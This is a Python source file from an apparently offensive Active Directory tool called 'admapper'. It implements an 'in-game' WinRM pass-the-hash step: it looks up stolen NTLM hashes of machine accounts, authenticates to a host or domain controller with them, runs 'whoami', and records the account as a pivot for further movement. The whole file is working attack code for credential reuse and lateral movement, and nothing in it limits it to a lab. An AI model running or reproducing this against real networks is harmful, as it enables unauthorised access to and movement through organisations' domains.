"""In-game WinRM Pass-the-Hash — verify shell and set machine pivot."""

from __future__ import annotations

from typing import TYPE_CHECKING

from admapper.core.output import print_success
from admapper.creds.common import collect_gained_hashes, pick_dc_ip, resolve_winrm_host_for_account
from admapper.escalate.analyze import set_pivot_user
from admapper.winrm.client import WinRMClient, WinRMError

if TYPE_CHECKING:
    from admapper.core.session import Session


def _normalize_account(name: str) -> str:
    base = str(name or "").strip().lower().rstrip("$")
    return f"{base}$" if base else ""


def lookup_machine_hash(ws_path, account: str) -> tuple[str, str] | None:
    want = _normalize_account(account)
    if not want:
        return None
    for raw_account, nthash in collect_gained_hashes(ws_path):
        if _normalize_account(raw_account) == want and nthash:
            name = raw_account if str(raw_account).endswith("$") else f"{raw_account}$"
            return name, nthash.lower()
    return None


def run_game_winrm_pth(session: Session, account: str) -> str:
    """Run whoami over WinRM PTH; return stdout on success."""
    if session.workspace is None:
        raise RuntimeError("no active workspace")

    ws_path = session.workspaces.path_for(session.workspace.name)
    domain = session.workspace.domain or ""
    if not domain:
        raise ValueError("sin dominio — escanea primero")

    match = lookup_machine_hash(ws_path, account)
    if not match:
        raise ValueError(f"sin hash NTLM para {account} — ejecuta exploit ACL gMSA")

    machine_user, nthash = match
    dc_ip = pick_dc_ip(session)
    host = resolve_winrm_host_for_account(
        machine_user,
        ws_path,
        domain,
        fallback_ip=dc_ip,
    )

    client = WinRMClient(
        host,
        domain=domain,
        username=machine_user,
        nthash=nthash,
        dc_ip=dc_ip,
        dc_fqdn=host,
        ticket_method="nthash",
    )
    try:
        result = client.execute("whoami", shell="cmd")
    except WinRMError as exc:
        raise ValueError(f"WinRM PTH falló: {exc}") from exc

    if result.returncode != 0 or not result.stdout.strip():
        raise ValueError(f"WinRM sin salida (rc={result.returncode})")

    set_pivot_user(session, machine_user)
    print_success(f"WinRM PTH OK — pivot → {domain}\\{machine_user}")
    print_success(f"whoami: {result.stdout.strip()}")
    return result.stdout.strip()
